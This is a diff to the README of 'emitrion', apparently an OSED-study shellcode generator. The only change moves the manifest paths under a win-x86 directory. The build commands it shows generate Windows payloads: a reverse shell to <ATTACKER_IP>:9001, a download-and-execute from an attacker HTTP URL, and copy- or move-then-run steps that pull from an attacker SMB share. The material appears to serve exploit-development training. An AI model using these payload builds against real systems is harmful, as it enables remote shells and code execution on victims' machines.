@@ -49,7 +49,7 @@ This is the most complex template and validates the entire framework.
 ### Build
 
 ```bash
-uv run emitrion emitrion/manifests/revshell.yaml \
+uv run emitrion emitrion/manifests/win-x86/revshell.yaml \
     --lhost <ATTACKER_IP> --lport 9001 \
     --no-assemble --out emitter_out/revshell
 ```
@@ -89,7 +89,7 @@ template copies a file and then executes the destination.
 ### Build
 
 ```bash
-uv run emitrion emitrion/manifests/ir_copy_then_run.yaml \
+uv run emitrion emitrion/manifests/win-x86/ir_copy_then_run.yaml \
     --src "C:\\OSED\\test_payload.exe" \
     --dst "C:\\Windows\\Temp\\copied_payload.exe" \
     --no-assemble --out emitter_out/copy_then_run
@@ -125,7 +125,7 @@ a file and then executes it from the destination path.
 For a local move (simpler to test than UNC):
 
 ```bash
-uv run emitrion emitrion/manifests/ir_move_then_run.yaml \
+uv run emitrion emitrion/manifests/win-x86/ir_move_then_run.yaml \
     --src "C:\\OSED\\test_payload.exe" \
     --dst "C:\\Windows\\Temp\\moved_payload.exe" \
     --no-assemble --out emitter_out/move_then_run
@@ -134,7 +134,7 @@ uv run emitrion emitrion/manifests/ir_move_then_run.yaml \
 For a UNC path (SMB share on the attacker):
 
 ```bash
-uv run emitrion emitrion/manifests/ir_move_then_run.yaml \
+uv run emitrion emitrion/manifests/win-x86/ir_move_then_run.yaml \
     --src "\\\\<ATTACKER_IP>\\share\\test_payload.exe" \
     --dst "C:\\Windows\\Temp\\moved_payload.exe" \
     --no-assemble --out emitter_out/move_then_run_smb
@@ -170,7 +170,7 @@ and WinExec.
 ### Build
 
 ```bash
-uv run emitrion emitrion/manifests/http_download.yaml \
+uv run emitrion emitrion/manifests/win-x86/http_download.yaml \
     --url "http://<ATTACKER_IP>/test_payload.exe" \
     --dst "C:\\Windows\\Temp\\http_payload.exe" \
     --no-assemble --out emitter_out/http_download
@@ -217,7 +217,7 @@ Tests advapi32.dll loading via LoadLibraryA, GetUserNameA into a
 ### Build
 
 ```bash
-uv run emitrion emitrion/manifests/get_username.yaml \
+uv run emitrion emitrion/manifests/win-x86/get_username.yaml \
     --command "calc.exe" \
     --no-assemble --out emitter_out/get_username
 ```
@@ -255,7 +255,7 @@ into processes where ExitProcess would kill the host.
 ### Build
 
 ```bash
-uv run emitrion emitrion/manifests/calc.yaml \
+uv run emitrion emitrion/manifests/win-x86/calc.yaml \
     --template ir_run_command \
     --command "calc.exe" \
     --exit-strategy terminate_process \
